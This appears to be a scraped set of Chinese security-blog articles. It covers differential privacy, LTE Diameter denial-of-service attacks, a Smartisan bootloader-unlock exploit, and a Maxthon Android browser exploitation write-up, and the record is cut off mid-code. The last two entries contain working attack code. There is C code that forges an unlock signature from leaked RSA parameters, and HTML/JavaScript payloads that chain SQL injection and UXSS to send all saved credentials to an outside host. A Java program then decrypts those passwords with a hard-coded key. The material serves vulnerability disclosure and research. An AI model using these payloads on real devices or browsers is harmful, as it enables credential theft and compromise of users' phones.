'姜路'相关技术有：一般化与删除，随机化，数据重构,数据净化，阻碍，抽样等。差分隐私差分隐私应该是现在比较火的一种隐私保护技术了，是基于数据失真的隐私保护技术，采用添加噪声的技术使敏感数据失真但同时保持某些数据或数据属性不变，要求保证处理后的数据仍然可以保持某些统计方 面的性质，以便进行数据挖掘等操作。差分隐私保护可以保证，在数据集中添加或删除一条数据不会影响到查询输出结果，因此即使在最坏情况下，攻击者已知除一条记录之外的所有敏感数据，仍可以保证这一条记录的敏感信息不会被泄露。想要体验的同学可以去Havard的Differential Privacy实验室，他们做了一个DP的原型实现.想要详细了解的同学可以看一下知乎上的这个问题https://www.zhihu.com/question/47492648关于动态脱敏系统的实现，现在一般有两种，一种是重写数据库程序代码，在权限判决后对请求语句进行重写，从而查询数据；另一种是用户的sql语句通过代理后，代理会对其中关于敏感信息的部分进行语句的替换，并且在返回时会重新包装为与原请求一致的格式交给用户。总结经过上面的分析，看来实现一个全自动的准确率高的脱敏系统难度相当大啊，希望自己能够圆满完成任务。","2016-11-19 13:08:54","网络安全","大数据隐私保护技术之脱敏技术探究","http://nsoad.com/Article/Network-security/20161119/815.html"
"5ccbfb664f2f0a0a7a69c162","诺基亚贝尔实验室和芬兰阿尔托大学的研究人员演示了如何攻击LTE网络协议。之前我们已经多次报道过SS7信号协议的漏洞了，利用协议的漏洞，攻击者可以追踪用户。当用户在各","root","诺基亚贝尔实验室和芬兰阿尔托大学的研究人员演示了如何攻击LTE网络协议。之前我们已经多次报道过SS7信号协议的漏洞了，利用协议的漏洞，攻击者可以追踪用户。当用户在各个国家旅游时，他们的手机会连接到当地运营商，然后再与用户本国的运营商联系。SS7协议能够用来漫游，但是这个协议存在漏洞，黑客可以利用漏洞来：跟踪位置监听诈骗对用户或网络发动DoS攻击窃取密码数据劫持短信拦截通过窃取一次性密码劫持Telegram、facebook、whatsapp的账号Diameter同样能被攻击Diameter被认为是LTE网络SS7协议的完善版本，理应更加安全，但专家们在这款协议中同样发现了安全问题，其中一个就是没有使用IPsec协议。研究人员表示，这就意味着Diameter能够被用同样的手段攻击。专家团队进行了数次测试评估攻击，测试中，他们对在芬兰的英国用户进行了网络攻击，发现了多种干扰服务的方法。攻击者可以选择暂时或永久地关闭用户连接，也可以针对某一整个地区实施攻击。研究团队在伦敦举行的黑帽大会上演示了成果。攻击过程要对其他运营商的系统或者用户进行攻击，研究人员首先得要能够访问IPX。他们演示了几种能够访问IPX的方法，比如政府可以强制本地的运营商给予权限。攻击者可以伪装成虚拟网络运营商，然后通过已有的运营商获得漫游网络的权限。也可以黑掉运营商的某个暴露在公网中的节点。我们来看看LTE网络的组成：LTE网络中的节点被称为MME（Mobility Management Entity，移动管理实体），它主要负责会话管理、用户验证、漫游以及将用户移交给其他网络。信号通过信号塔传播，同时归属用户服务器（HSS，Home Subscriber Server）负责存储用户的相关信息及其相关业务信息。LTE网络中的其他重要组件包括DEA（DiameterEdge Agents）负责在攻击中充当进入互联网络的网关。在实施攻击的过程中，黑客需要有受害者的IMSI，获取过程并不难：黑客可以伪装成短信服务中心，试图发送短信到受害者的手机号，从而获得IMSI。因此，只要知道对方的移动台ISDN号码(MSISDN)，知道对方运营商的DEA，就可以对其进行攻击了。攻击者首先通过DEA给HSS发送一个路由信息请求，而请求的回复中会包含用户的IMSI和用户连接的是哪个MME。接着，攻击者伪装成某个合作伙伴的HSS，向受害者的MME发送一条“取消位置请求(CLR)”的信息，导致用户断线。这个CLR信息原来是当用户从一个MME切换到另一个MME时发送的。多种攻击方式研究人员还提出了另一种漏洞的利用方法，通过这种方法可以“放大”请求。研究人员注意到当用户重新接入网络时，设备向MME发送20条不同的消息。如果攻击者强制让大量用户同时下线，当他们重新上线时，MME就会涌入大量消息，导致MME被DoS攻击，进而造成MME所负责的一大块区域停止服务。另一个DoS攻击场景是这样的：攻击者冒充HSS，向受害者的MME发送一条IDR（Insert Subscriber Data Request，插入用户数据请求）信息，信息的内容比较特别，是一个特殊的，表示无服务的值。这样用户就会永久被踢下网络。如果用户想要再次连接，唯一的办法就是联系移动运营商了。","2016-11-14 17:50:35","网络安全","如何利用LTE网络协议漏洞把手机踢下网","http://nsoad.com/Article/Network-security/20161114/769.html"
"5ccbfb664f2f0a0a7a69c163","Smartisan是手机中为数不多倾心于工业设计和用户体验的。老罗跨界过猛，也难免导致其最初的想法和现实存在差距。bootloader到底锁还是不锁，甚至曾被一个T1用户弄上法庭来质问。","盘古Team","关于bootloader锁Smartisan是手机中为数不多倾心于工业设计和用户体验的。老罗跨界过猛，也难免导致其最初的想法和现实存在差距。bootloader到底锁还是不锁，甚至曾被一个T1用户弄上法庭来质问。当然，能从认为加锁是对系统的不自信，到后来发现解锁是安全隐患，绝对是个进步（loser口中的打脸）。技术层面来说，究竟T系列手机的bootloader能不能解锁呢？答案是，能。或者说，本来不能，但由于bootloader里存在的两个漏洞，恰好可解。分析bootloader正像Smartisan OS本身，其ROM目录结构也是极简的。firmware-update目录下emmc_appsboot.mbn就是bootloader镜像。由于是ELF格式，不需要更多的处理，就能逆向出不错的代码结构。无论是T1还是T2，bootloader的代码差不多，下面的分析选择的是T2的2.6版的ROM。和很多高通芯片的手机一样，T2的bootloader是基于高通开源的lk。所以参考源码，可以很快梳理出bootloader的执行流程。启动后，根据按键组合，决定是否进入recovery，如果继续留在bootloader模式，就会注册一系列fastboot command，循环等待用户输入，决定下一步动向，如图1。图1.注册fastboot command显然，control_flag为0的话，cmd_table中只有前四条命令被注册，后续命令就都无法使用了。通过观察cmd_table（如图2），可以发现那些真正令人激动的函数（比如oem unlock）都在比较靠后的位置上。图2.fastboot可以注册的命令列表在搞清楚control_flag这个全局标记到底何去何从之前，不如先探探这仅存四条命令的究竟。reboot，reboot-bootloader命令正像他们的名字一样无趣，flash看起来就很有故事了。执行flash命令时，如果control_flag为0，那就只能写一个名为security的分区。而control_flag为1时，所有其他分区就都可以写了，如图3所示：图3.写分区时的判断联想之前fastboot command注册的过程，control_flag为0时，绝大部分功能无效，且分区不可写，control_flag应该就是is_allow_unlock，即bootloader是否上锁的标记。系统启动时，is_allow_unlock默认置0。当flash了security分区后，is_allow_unlock会有一次赋值操作，并且一旦赋值为1，就会提示解锁成功，如图4所示：图4.对security分区的检测，判断是否可以解锁分析到这里基本可以肯定，T2提供了解锁功能，关键是写入security分区的内容是否能够经得住考验。解锁bootloaderverify_security()函数比较复杂，涉及很多密码学算法的演绎。好在它使用的是openssl的标准库函数，识别起来有章可循。security分区内容采用的是RSA+MD5签名校验。合理的猜测是，官方本来设计的解锁流程其他厂商类似，即用户提交手机的序列号等信息，然后通过unlock时输入厂商给的解锁码（根据序列号计算出来的签名信息），实现解锁。只不过这一次解锁码是通过写入security分区实现输入。security[128]（security分区第128字节）是RSA初始化函数选择的依据，security[129]作为序列号长度。然后factory[5]（factory分区的第5字节）起始的序列号作为MD5的计算依据，得到的hash值和security[0-127]签名信息验证的结果做比，相同返回1，否则返回0。这几乎是每个签名验证的都在用的标准化流程，采用的算法成熟，且由openssl实现（难怪发布会几百万门票钱捐给了openssl），基本不会有瑕疵。由于bootloader只存放了公钥e，没有私钥d，手机用户自己是没办法构造出128字节的签名信息的。不过，由于代码上一些不大不小的问题，我们恰好可以绕过这些限制，构造出和序列号无关的通用解锁码。首先在RSA初始化时，如图5和6，当security[128]为66和67以外的数值时，初始化函数被选择为sub_F924A90。图5.根据security[128]指定的函数来初始化RSA密钥图6.RSA密钥初始化跟进sub_F924A90后，可以看见图6所示的密钥填充，BN_bin2bn是openssl的库函数，用于将内存中存放的Big-Endian字符数组转化为Bignum类型，方便RSA的内部计算。私钥d填写的是伪数值，但p和q都填写的是真值。侧面说明写这段代码的人不太了解RSA，毕竟其安全性完全依赖于大数分解的NP难，而现在n的两个素数因子p和q都给了，虽然本意是加快计算速度，但私钥d也就因而可以从公钥e推出来了，d=e-1mod (p-1)(q-1)，这就导致了第一个逻辑漏洞，用于伪造签名。接下来，如图7，完成了RSA的初始化以后，会接着从factory分区读取数据：图7. 读取factory分区，得到序列号，然后计算MD5究竟从factory分区读取多少字节是可控的，由security[129]决定。读取出来正常应该是一串字母开头后接一串数字的序列号，MD5后得到一串16字节的hash。最后利用RSA的公钥验证security[0-127]的128字节签名是否属于hash。由于security[129]完全可控，就导致了第二个逻辑漏洞。如果该数指定为0，则MD5是针对一个空字符串进行计算的，计算结果总是d41d8cd98f00b204e9800998ecf8427e。所以无论是哪台手机，factory分区内容如何，签名验证将总是针对常量进行。只要构造该常量的签名写入security分区，就能够完成解锁。为了减少padding，encoding等一系列开发可能造成的不确定性，在生成解锁码时，同样采用openssl的代码实现，示例如下：#include #include #include #include #include unsigned char m3_n[128] = {\0xA4,0x0C, 0x69, 0x70, 0x25, 0x4F, 0x36, 0x49, 0x8E,\0x83,0x4B, 0x74, 0x9A, 0x75, 0xC9, 0xF4, 0x7F, 0xE5,\0x62,0xA8, 0xDE, 0x11, 0x13, 0x03, 0x57, 0x89, 0x31,\0xCB,0x58, 0x84, 0xC8, 0x26, 0xBA, 0x2B, 0x60, 0xB5,\0xB8, 0xA5, 0xD9, 0xBD, 0x27, 0x48, 0x3D,0x33, 0x38,\0xA1,0x72, 0x62, 0x64, 0x87, 0x5E, 0x71, 0xF4, 0x1F,\0xCB,0x68, 0x83, 0x92, 0xEA, 0x4B, 0xFF, 0x06, 0x38,\0xAF,0xD5, 0x65, 0x55, 0x94, 0x04, 0x91, 0x88, 0xF7,\0xA4,0x57, 0x72, 0x29, 0xFE, 0xEA, 0xB1, 0x27, 0x25,\0xC1,0x12, 0x7D, 0x16, 0x6F, 0x13, 0xAF, 0xE2, 0x00,\0x8D,0x5E, 0xA4, 0x0A, 0xB6, 0xF3, 0x71, 0x97, 0xC0,\0xB0,0x60, 0xF5, 0x7C, 0x7F, 0xAA, 0xC4, 0x64, 0x20,\0x3F,0x52, 0x0A, 0xA3, 0xC3, 0xEF, 0x18, 0xB6, 0x45,\0x7D,0x72, 0x1E, 0xE2, 0x61, 0x0C, 0xD0, 0xD9, 0x1D,\0xD0,0x5B\};unsigned char m3_e[1] = {3};unsigned char m3_d[128] = {\0x6d,0x5d,0x9b,0xa0,0x18,0xdf,0x79,0x86,0x5f,0x02,0x32,0x4d,0xbc,0x4e,0x86,0xa2,\0xff,0xee,0x41,0xc5,0xe9,0x60,0xb7,0x57,0x8f,0xb0,0xcb,0xdc,0xe5,0xad,0xda,0xc4,\0x7c,0x1c,0xeb,0x23,0xd0,0x6e,0x91,0x28,0xc4,0xda,0xd3,0x77,0x7b,0x16,0x4c,0x41,\0x98,0x5a,0x3e,0xf6,0xa2,0xbf,0xdc,0xf0,0x57,0xb7,0x46,0xdd,0x54,0xae,0xd0,0x74,\0x27,0xaa,0xad,0xf9,0xb9,0x33,0x8f,0x29,0x3b,0xf2,0xee,0x97,0x03,0x0b,0x5c,0xfc,\0x92,0x95,0x6f,0x05,0xcd,0xbf,0x1c,0x77,0x16,0xce,0xd9,0x13,0xfb,0xf2,0x8f,0x74,\0x09,0xca,0x78,0xf0,0xc7,0x4a,0xc2,0xc5,0xed,0x58,0xc1,0xfa,0xa1,0x6f,0x64,0x26,\0x73,0x75,0x73,0x97,0x21,0xb4,0x01,0x13,0xad,0xd7,0xd5,0xbc,0x22,0x75,0x00,0xcb,\};int main(int argc, char*argv[]) {MD5_CTX md5ctx;unsigned chardigest[MD5_DIGEST_LENGTH];unsigned charsigret[128];unsigned int siglen;unsigned chartestdata;MD5_Init(&amp;md5ctx);MD5_Update(&amp;md5ctx, &amp;testdata, 0);MD5_Final(digest, &amp;md5ctx);RSA *rsa =RSA_new();rsa-&gt;n =BN_bin2bn(m3_n, 128, rsa-&gt;n);rsa-&gt;e =BN_bin2bn(m3_e, 1, rsa-&gt;e);rsa-&gt;d =BN_bin2bn(m3_d, 128, rsa-&gt;d);RSA_sign(4,digest, 16, sigret, &amp;siglen, rsa);FILE *fp =fopen(“security.img”,”wb”);fwrite(sigret, siglen, 1, fp);fwrite(“\x40\x00”, 2, 1, fp);fclose(fp);return 0;}刷入security.img后，手机就可以解锁了。虽然上述分析是基于T2的ROM，T1也完全适用。如图8所示，T1刷入security.img同样可以解锁。图8. T1刷入security.img后解锁图9.T2刷入security.img后解锁And Then Some2014年老罗在微博上提过关于bootloader方面的打算，“官方会提供 boot loader，方便你刷机，只是刷机后会失保”，所以初代ROM里的确如我们所见保留了解锁bootloader的功能。2016年有人因为提供解锁而状告Smartisan，老罗胜诉后说道“我在微博上说过做bootloader，但技术部门因安全考虑否决了，我代表我自己道歉。”，所以肯定是取消了该功能。尽管官方从来没有发布过任何解锁的方法，底层代码倒是可以清晰反映出这段经历。对于T1和T2，2.6.7是最后一个可以解锁的ROM版本号，2.6.8开始，fastboot command列表被改写为图10所示内容，大部分指令被阉：图10. 2.6.8后的版本中fastboot已经没有什么实质功能了所以如果要解锁3.x的Smartisan OS，可以下载2.6.7的ROM完成降级，毕竟旧版本的ROM同样带有签名，使用recovery时允许刷入手机。更新到旧版的bootloader后，再用fastboot flash security security.img进行解锁。解锁后，每次升级用第三方无签名验证的recovery，更新除bootloader以外的模块即可。这样即便最新系统暂时没有公开的内核漏洞，也能root。一般的Android手机，只要有签名认证的老版本bootloader里有漏洞，在系统没有开启限制（比如SW_ID）时，总可以通过降级，解锁，然后升级回新系统，刷入supersu的方式root。","2017-02-06 20:18:19","移动安全","利用漏洞解锁锤子T1/2手机的bootloader","http://nsoad.com/Article/MobileSecurity/20170206/1051.html"
"5ccbfb664f2f0a0a7a69c164","寻找客户端 SQL 注入漏洞目前为止我们已经使用 catchform 方法来利用 UXSS 漏洞，但是利用暴露的 catchform 方法在 mxbrowser_default 数据库中触发客户端 SQL 注入也是可行","kong","寻找客户端 SQL 注入漏洞目前为止我们已经使用 catchform 方法来利用 UXSS 漏洞，但是利用暴露的 catchform 方法在 mxbrowser_default 数据库中触发客户端 SQL 注入也是可行的，这可以远程破坏数据库的完整性和机密性。考虑到下面的代码取自 com.mx.browser.a.f 类。当域的用户名/密码行不存在时，使用参数化的 SQL 语句将数据插入本地数据库。当该域的用户名/密码行已经存在时，使用动态字符串链接构建 UPDATE SQL 语句。恶意网页控制 b 变量（用户名）和 a 变量（host），但不直接控制 c 变量（密码），因为密码是被加密编码过的。        Cursor v1;        SQLiteDatabase v0 = g.a().d();        String v2 = ""select * from mxautofill where host =?"";        h.f();        try {            v1 = v0.rawQuery(v2, new String[]{this.a});            if(v1.getCount() &lt;= 0) {                ContentValues v2_1 = new ContentValues();                v2_1.put(""host"", this.a);                v2_1.put(""username"", this.b);                v2_1.put(""password"", this.c);                v0.insert(""mxautofill"", null, v2_1);            }            else {                v1.moveToFirst();                v1.getColumnIndexOrThrow(""host"");                v2 = ""update mxautofill set username = \'"" + this.b + ""\',passwrd = \'"" + this.c + ""\' where host = \'"" + this.a + ""\'"";                h.f();                v0.execSQL(v2);            }        }通过 SQL 注入篡改数据库，在所有保存过的域下触发登录页面 UXSS考虑到我们能够注入的 SQL 语句是一个 UPDATE 语句，作用是更改一个域下的填充信息，可以想到最简单的利用方法便是操纵 UPDATE 语句篡改所有保存的自动填充信息，配合设计好的数据来利用登录页面 UXSS 漏洞。这个漏洞可以让我们在每个受害者常用的登录页面注入 JavaScript（假设受害者使用自动填充功能）。我构建了以下 HTML 页面，通过调用 catchform 方法来利用 SQL 漏洞。注意我们利用漏洞必须尝试使用浏览器之前存储的信息来自动填充信息，因为 SQL 注入与 UPDATE 语句相关联，而不是最初的 INSERT 语句。因此攻击者可能选择流行的 URL 作为 documentURI 的值。&lt;html&gt;  &lt;body&gt;  &lt;script&gt;  var json = '{""documentURI"":""https://accounts.google.com/"",""inputs"":[{""id"":""username"",""name"":""username"",""value"":""loginsqltest@gmail.com\'\'-alert(\'\'SqlTest:\'\'+document.domain)-\'\'\'--""},{""id"":""password"",""name"":""password"",""value"":""fakepassword""}]}';  mxautofill.catchform(json);  &lt;/script&gt;  &lt;/body&gt;  &lt;/html&gt;  当用户访问恶意页面时，会提示用户“save your account？”，并且用户必须在 SQL 注入漏洞被利用之前点击 “Yes”。—— 一些用户交互然后浏览器执行以下 SQL 语句。请注意，我们在用户名字段注入我们的 JavaScript，然后使用 SQL 注入注释掉其它的 SQL 语句，包括 WHERE 子语句，以便将更新限制为只有一行。update mxautofill set username = 'loginsqltest@gmail.com''-alert(''SqlTest:''+document.domain)-'''-- ',password = '3tJIh6TbL87pyKZJOCaZag%3D%3D' where host = 'accounts.google.com'  检测设备上的 SQLite 数据库我们看到我们已经成功更新了 mxautofill 表中的所有行。—— 本地 SQLite 数据库已被篡改下一次，当受害者访问存储自动填充信息的域名之一的登录页面时，我们的 JavaScript 代码通过 WebView 的 loadUrl 方法执行。javascript:mx_form_fill('loginsqltest@gmail.com'-alert('SqlTest:'+document.domain)-'','fakepassword')  —— 当受害者浏览 Twitter 或者 Google 的登录页面时 ，JS payload 得以触发使用 SQL 注入和登录页面 UXSS 提取敏感数据如果我们要从mxautofill表远程提取所有的用户名和加密密码怎么办？我构造了以下 HTML 页面利用 SQL 漏洞实现了目标。基本上，我们将使用内部查询构建一个 JavaScript 字符串，其中包括存储在表中的所有主机，用户名和加密过的密码。然后我们使用登录页面 UXSS 漏洞和 AJAX 从设备窃取信息。&lt;html&gt;  &lt;body&gt;  &lt;script&gt;  var json = '{""documentURI"":""https://accounts.google.com/"",""inputs"":[{""id"":""username"",""name"":""username"",""value"":""\'\');var request=new XMLHttpRequest();dataToSteal=\'\'\'||(SELECT GROUP_CONCAT(host||\':\'||username||\':\'||password) from mxautofill)||\'\'\';request.open(\'\'GET\'\',\'\'http://d3adend.org/c.php?c=\'\'+dataToSteal,false);request.send();//\'--""},{""id"":""password"",""name"":""password"",""value"":""fakepassword""}]}';  mxautofill.catchform(json);  &lt;/script&gt;  &lt;/body&gt;  &lt;/html&gt;  当用户访问恶意页面时，会提示用户“sava your account？”，而且 利用SQL 注入漏洞之前用户必须点击“Yes”。—— 点击“Yes”浏览器接下来会执行以下 SQL 语句。update mxautofill set username = ''');var request=new XMLHttpRequest();dataToSteal='''||(SELECT GROUP_CONCAT(host||':'||username||':'||password) from mxautofill)||''';request.open(''GET'',''http://d3adend.org/c.php?c=''+dataToSteal,false);request.send();//'--',password = '3tJIh6TbL87pyKZJOCaZag%3D%3D' where host = 'accounts.google.com'  mxautofill 表中的所有行都已经在客户端数据库中更新。—— 所有记录都均被修改当受害者访问有自动填充信息的域登录页面时，我们的 JavaScript 代码得以执行。在实际使用过程中， dataToSteal 变量将包含真实的账户凭据。javascript:mx_form_fill('');var request=new XMLHttpRequest(); dataToSteal='acccount_1_hostname:account_1_username:account_1_encrypted_password, acccount_2_hostname:account_2_username:account_2_encrypted_password,etc.'; request.open('GET','http://d3adend.org/c.php?c='+dataToSteal,false);request.send();//'','fakepassword')  —— 不可见的漏洞利用得以执行—— 域名，用户名和加密的密码通过 AJAX 发送到攻击者控制的服务器。因此，我们现在有了来自受害者的 mxautofill 表的主机名，用户名和加密密码，但我们需要解密密钥。为了获取加密密钥，我仅使用了一个自定义的 Xposed 模块在两个不同的设备上来 hook 一个与自动填充功能相关的加密方法调用。在两个设备上， Maxthon 使用了相同的硬编码密钥（“eu3o4[r04cml4eir”）进行密码存储。几个月后，我抱着一丝希望搜索了 “eu3o4[r04cml4eir”，却发现了 Exatel 的一些有趣的关于 windows 版本的 Maxthon 的隐私安全研究。他们的结论是“整个用户的网站浏览历史会到达位于北京的 Maxthon 作者的服务器，还包括所有输入的 Google 搜索记录”。浏览器的桌面版本使用相同的加密密钥加密用户的浏览历史，正如我在 Android 版本所发现的那样。开发者团队在面对用户时并不承认任何错误， CEO 随后发表声明。“Exatel 还报告说，Maxthon 将 URL 发送回其服务器。正如所有 URL 的安全检查工作，Maxthon 的云安全扫描模块（cloud secure）检测用户所访问的网站的安全性。通过执行 URL 安全检测，Maxthon 向其服务器发送 URL 以检测网站是否安全。由于这些安全检查的存在，自2005年以来我们已经阻止了用户访问数百万的虚假网站和恶意网站。在我们的最新版本中，我们将添加一个选项，可供用户关闭扫描模块。”(原文)“Exatel also reported that Maxthon sends URLs back to its server. Just as all URL security checks work, Maxthon’s cloud security scanner module (cloud secure) checks the safety of the websites our users visit. By implementing this URL security check, Maxthon sends URLs to its server to check if the website is safe or not. As a result of these security checks, we have prevented our users from visiting millions of fake and malicious websites since 2005. In our latest version, we will add an option for users to turn off the scanner.”我不确定我相信这个功能实际上实际上是一个“云安全扫描器”，像 CEO 声称，但不管其意图，通过 HTTP 使用硬编码密钥发送加密的浏览器历史纪录可不是个好主意。在 Android 的版本的浏览器中，我还发现了类似的功能在 com.mx.browser.statistics.z 类中。这里需要注意，以下代码将加密的“统计”数据发送到同一个 URL ，并且像 Exatel 的研究中显示的那样使用相同的加密密钥。final class z extends AsyncTask {      z(PlayCampaignReceiver arg1, String arg2) {        this.b = arg1;        this.a = arg2;        super();    }    private Void a() {        JSONObject v0 = new JSONObject();        try {            v0.put(""l"", ch.r);            v0.put(""sv"", ch.e);            v0.put(""cv"", ch.l);            v0.put(""pn"", ch.g);            v0.put(""d"", ch.e());            v0.put(""pt"", ""gp_install"");            v0.put(""m"", ""main"");            JSONObject v1 = new JSONObject();            v1.put(""imei"", ch.m);            v1.put(""refer"", this.a);            v1.put(""aid"", ch.n);            v1.put(""model"", ch.p);            v1.put(""mac"", ch.u);            v0.put(""data"", v1);            new StringBuilder(""before = "").append(v0).toString();            String v0_3 = Uri.encode(new String(Base64.encode(a.a(v0.toString(), ""eu3o4[r04cml4eir""), 2), ""UTF-8""));            new StringBuilder(""after urlencode ="").append(v0_3).toString();            y v1_1 = new y();            v0_3 = ""http://g.dcs.maxthon.com/mx4/enc?keyid=default&amp;data="" + v0_3;            new StringBuilder(""url="").append(v0_3).append("";response = "").append(v1_1.a(v0_3, 3).getStatusLine().getStatusCode()).toString();        }反正已经跑题了。那就干脆把通过客户端 SQL 注入和登陆页面 UXSS 漏洞获取的密码给破解了吧。在写出加密算法，加密模式和密钥之后，我写了以下简单的 Java 程序。import java.util.Base64;  import javax.crypto.Cipher;  import javax.crypto.spec.SecretKeySpec;public class MaxDecrypt {      public static void main(String[] args) throws Exception {        String rawUserDataArg = args[0];        System.out.println("""");        if(rawUserDataArg != null) {            String[] rawUserDataArray = rawUserDataArg.split("","");            for(String rawUserData : rawUserDataArray) {                String host = rawUserData.split("":"")[0];                String username = rawUserData.split("":"")[1];                String encryptedPassword = rawUserData.split("":"")[2];                String decryptedPassword = decrypt(encryptedPassword);                System.out.println(""===================================="");                System.out.println(""Host: "" + host);                System.out.println(""Username: "" + username);                System.out.println(""Password: "" + decryptedPassword);            }            System.out.println(""===================================="");        }    }    public static String decrypt(String ciphertext) throws Exception {        SecretKeySpec sks = new SecretKeySpec(""eu3o4[r04cml4eir"".getBytes(""UTF-8""), ""AES"");        Cipher cipher = Cipher.getInstance(""AES/ECB/NoPadding"");        Base64.Decoder decoder = Base64.getDecoder();        byte[] ciphertextBytes = decoder.decode(ciphertext);        cipher.init(Cipher.DECRYPT_MODE, sks);        byte[] plaintextBytes = cipher.doFinal(ciphertextBytes);        return new String(plaintextBytes);    }}—— 解密获取到的凭据任意文件写入漏洞 - 越过远程执行代码的障碍一般来说，在 Android 操作系统中，非特权应用的任意文件写入漏洞很难变成远程代码执行。1） 应用程序主要 dex 代码，或 OAT 进程的输出由系统用户所有，因此在正常情况下不应该覆盖此代码。2） 应用程序的存储 ELF 共享对象的 lib 目录，实际上是一个链接到所有者为系统用户目录，所以正常情况下不太可能覆盖这些代码。话虽如此，在很多情况下，任意文件写入漏洞可以很容易地变成远程代码执行漏洞。1）目标应用程序通过 DexClassLoader 类执行动态类加载，并且可以覆盖存储的dex代码。2）目标应用程序不正确存储其ELF共享对象文件，使得这些文件不属于系统用户。 Jake Van Dyke 和 rotlogix 都提到了 SO 全局可写的应用范例，这允许根据情况进行本地或远程利用。3） 目标应用程序以 系统用户权限运行。4） 目标应用程序是 multidex 应用，且不在使用 ART 运行环境的设备上运行。我最初确定这些漏洞时我不相信这些条件有那条成立，但几个月后，当一个较新版本的发布时，我注意到一些新的软件包被添加到代码库，包括 com.igexin.。这显然是一个被赛门铁克标记为不需要的应用程序的广告库，其绑定了一些会收集用户信息的 Android 应用，而且应用会把这些信息发送到服务器。事实证明，这个广告使用了 DexClassLoader 类执行加密代码的动态库加载，所以我们可以利用这个功能，通过任意文件写入漏洞来实现远程代码执行。在新版本的浏览器中，我注意到 /data/data/com.mx.browser/files 目录中看起来很奇怪的新文件，如 tdata_qiz011，tdata_qiz011.dex，tdata_rqS304和 tdata_rqS304.dex。 注意虽然文件名看起来貌似随机生成，在多个设备上安装应用程序后，我注意到文件名不是根据设备特定生成的。—— 包含优化 dex 文件的可疑文件—— 未知的文件格式和优化的 dex 文件我决定调查 tdata_rqS304 里面有什么东西。我怀疑这是一个加密的 JAR/APK 文件，但我不确定。—— 加密过的 APK/JAR ？执行动态类加载的代码位于 com.igexin.push.extension.a 类中。代码似乎加载了一个文件，比如 tdata_rqS04 ，解密到一个 JAR 文件，如 tdata_reS304.jar ，从 JAR 文件中加载一个类，创建一个类的实例（调用构造函数），然后删除原 JAR 文件（使其逆向工程中隐藏）。我猜测 com.igexin.a.a.a.a.a 是解密方法。   public boolean a(Context arg10, String arg11, String arg12, String arg13, String arg14) {        Class v0_1;        File v2 = new File(arg11);        File v3 = new File(arg11 + "".jar"");        File v4 = new File(arg10.getFilesDir().getAbsolutePath() + ""/"" + arg14 + "".dex"");        this.a(v2, v3, arg13);        if(v3.exists()) {            try {                DexClassLoader v2_1 = new DexClassLoader(v3.getAbsolutePath(), arg10.getFilesDir().getAbsolutePath(), null, arg10.getClassLoader());                try {                    v0_1 = v2_1.loadClass(arg12);                }                catch(Exception v2_2) {                }            }            catch(Throwable v0) {                goto label_74;            }            try {                v3.delete();                v4.exists();                if(v0_1 == null) {                    boolean v0_2 = false;                    return v0_2;                }                Object v0_3 = v0_1.newInstance();...    public void a(File arg10, File arg11, String arg12) {        BufferedOutputStream v1_5;        Throwable v8;        int v1_1;        FileInputStream v2;        BufferedOutputStream v0_2;        FileOutputStream v2_1;        FileInputStream v3;        FileOutputStream v1 = null;        try {            v3 = new FileInputStream(arg10);        }        catch(Throwable v0) {            v2_1 = v1;            v3 = ((FileInputStream)v1);            goto label_45;        }        catch(Exception v0_1) {            v0_2 = ((BufferedOutputStream)v1);            v2 = ((FileInputStream)v1);            goto label_22;        }        try {            v2_1 = new FileOutputStream(arg11);        }        catch(Throwable v0) {            v2_1 = v1;            goto label_45;        }        catch(Exception v0_1) {            v0_2 = ((BufferedOutputStream)v1);            v2 = v3;            goto label_22;        }        try {            v0_2 = new BufferedOutputStream(((OutputStream)v2_1));            v1_1 = 1024;        }        catch(Throwable v0) {            goto label_45;        }        catch(Exception v0_1) {            v0_2 = ((BufferedOutputStream)v1_1);            v1 = v2_1;            v2 = v3;            goto label_22;        }        try {            byte[] v1_4 = new byte[v1_1];            while(true) {                int v4 = v3.read(v1_4);                if(v4 == -1) {                    break;                }                byte[] v5 = new byte[v4];                System.arraycopy(v1_4, 0, v5, 0, v4);                v0_2.write(com.igexin.a.a.a.a.a(v5, arg12));            }com.igenxin.a.a.a.a 类使用本地加密算法执行解密。输入验证至关重要（""key is fail!""）。package com.igexin.a.a.a;public class a {      public static void a(int[] arg2, int arg3, int arg4) {        int v0 = arg2[arg3];        arg2[arg3] = arg2[arg4];        arg2[arg4] = v0;    }    public static boolean a(byte[] arg6) {        boolean v0_1;        int v3 = arg6.length;        if(v3  256) {            v0_1 = false;        }        else {            int v2 = 0;            int v0 = 0;            while(v2  3) {                        v0_1 = false;                        return v0_1;                    }                }                ++v2;            }            v0_1 = true;        }        return v0_1;    }    public static byte[] a(byte[] arg1, String arg2) {        return a.a(arg1, arg2.getBytes());    }    public static byte[] a(byte[] arg7, byte[] arg8) {        int v1 = 0;        if(!a.a(arg8)) {            throw new IllegalArgumentException(""key is fail!"");        }        if(arg7.length &lt;= 0) {            throw new IllegalArgumentException(""data is fail!"");        }        int[] v3 = new int[256];        int v0;        for(v0 = 0; v0 &lt; v3.length; ++v0) {            v3[v0] = v0;        }        v0 = 0;        int v2 = 0;        while(v0 &lt; v3.length) {            v2 = (v2 + v3[v0] + (arg8[v0 % arg8.length] &amp; 255)) % 256;            a.a(v3, v0, v2);            ++v0;        }        byte[] v4 = new byte[arg7.length];        v0 = 0;        v2 = 0;        while(v1 &lt; v4.length) {            v0 = (v0 + 1) % 256;            v2 = (v2 + v3[v0]) % 256;            a.a(v3, v0, v2);            v4[v1] = ((byte)(v3[(v3[v0] + v3[v2]) % 256] ^ arg7[v1]));            ++v1;        }        return v4;    }    public static byte[] b(byte[] arg1, String arg2) {        return a.a(arg1, arg2.getBytes());    }}所以现在我们知道如何揭秘 JAR 文件了，但是我们需要知道加密密钥。我又通过 Xposed 使用了模块动态分析来却id那个每个文件使用了哪个加密密钥以及加载了哪个类。以下是我从 tdata_rqS304 文件中获取到的信息。我还在不同设备验证了加密密钥不是针对特定设备的。例如，加密库使用“5f8286ee3424bed2b71f66d996b247b8”作为密钥来解密 tdata_rqS304 文件。Method Caller: com.igexin.push.extension.a@420bfd48  Argument Types: com.igexin.sdk.PushService, java.lang.String, java.lang.String, java.lang.String, java.lang.String  Argument 0: com.igexin.sdk.PushService@420435b8  Argument 1: /data/data/com.mx.browser/files/tdata_rqS304  Argument 2: com.igexin.push.extension.distribution.basic.stub.PushExtension  Argument 3: 5f8286ee3424bed2b71f66d996b247b8  Argument 4: tdata_rqS304  现在我们用于了解密文件并检查 JAR 文件的所有信息。以下 Java 程序将揭秘 tdata_rqS304 文件。import java.util.Base64;  import 